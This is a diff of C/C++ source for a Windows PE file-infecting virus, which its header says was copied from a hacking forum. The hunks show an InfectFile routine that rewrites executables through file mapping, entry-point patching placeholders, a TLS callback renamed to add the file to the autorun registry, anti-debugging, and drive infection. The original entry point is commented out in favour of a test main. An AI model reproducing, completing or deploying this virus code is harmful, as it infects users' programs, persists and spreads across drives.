@@ -1,10 +1,15 @@
 // code is copy paste from http://www.rohitab.com/discuss/topic/40857-my-first-pe-infection-virus-zero-virus/
 
+#define _CRT_SECURE_NO_WARNINGS
+#define _CRT_SECURE_NO_DEPRECATE
+
+#include <iostream>
+
 #include <stdio.h>
 #include <Windows.h>
 #include <ImageHlp.h>
 #include "ntdll.h"
- 
+
 #pragma comment(lib,"imagehlp.lib")
 #pragma comment(lib,"ntdll.lib")
  
@@ -191,14 +196,14 @@ int WINAPI VirusCode()
  
     __asm
     {
-        mov eax,0x41414141
-        mov EntryPointRva,eax
+        mov eax, 0x41414141
+        mov EntryPointRva, eax
  
-        mov eax,0x42424242
-        mov VirusRva,eax
+        mov eax, 0x42424242
+        mov VirusRva, eax
  
-        mov eax,0x43434343
-        mov FileSize,eax
+        mov eax, 0x43434343
+        mov FileSize, eax
     }
  
     Peb = NtCurrentPeb(); // Get the PEB
@@ -449,7 +454,8 @@ void WINAPI InfectFile(PSTR FileName)
     PIMAGE_NT_HEADERS p_image_nt_headers;
     PIMAGE_SECTION_HEADER p_image_section_header;
      
-    HANDLE hFile,hMap;
+    HANDLE hFile = nullptr;
+    HANDLE hMap = nullptr;
     PVOID MappedFile;
     ULONG i,FileSize,SectionSize,CodeSize,SectionAlignment,AlignedSize,OldChecksum,NewChecksum;
  
@@ -474,7 +480,7 @@ void WINAPI InfectFile(PSTR FileName)
         // Create a mapping of a file (original file does not change when we change content in 
         // the mapping file, to apply the change in mapped file to the original file, use 
         // FlushViewOfFile())
-        hMap = CreateFileMapping(hFile,NULL,PAGE_READWRITE,0,AlignedSize,NULL);
+        hMap = CreateFileMappingA(hFile,NULL,PAGE_READWRITE,0,AlignedSize,NULL);
  
         if(hMap)
         {
@@ -613,7 +619,7 @@ void WINAPI SearchFile(PSTR Directory)
     }
 }
  
-void NTAPI TlsCallback(PVOID Module,ULONG Reason,PVOID Context)
+void NTAPI AddFileToAutoRunRegistry(PVOID Module,ULONG Reason,PVOID Context)
 {
     HKEY hKey;
     char ModulePath[1024],TempPath[60];
@@ -655,7 +661,7 @@ void NTAPI TlsCallback(PVOID Module,ULONG Reason,PVOID Context)
     }
 }
  
-__declspec(allocate(".CRT$XLB")) PIMAGE_TLS_CALLBACK TlsCallbackAddress[] = {TlsCallback,NULL};
+__declspec(allocate(".CRT$XLB")) PIMAGE_TLS_CALLBACK TlsCallbackAddress[] = {AddFileToAutoRunRegistry,NULL};
 
 DWORD WINAPI AntiDebug(PVOID p)
 {
@@ -754,7 +760,8 @@ DWORD WINAPI InfectDrives(PVOID p)
         NtDelayExecution(FALSE,&delay);
     }
 }
- 
+
+/*
 int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow)
 {
     HANDLE hFile;
@@ -800,4 +807,11 @@ int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow)
  
     NtTerminateThread(NtCurrentThread(),0); // Terminate the current thread
     while(1);
+}
+*/
+
+int main()
+{
+    std::cout << "OKE" << std::endl;
+    //InfectFile((PSTR)"E:\\Code\\C++\\test.exe");
 }
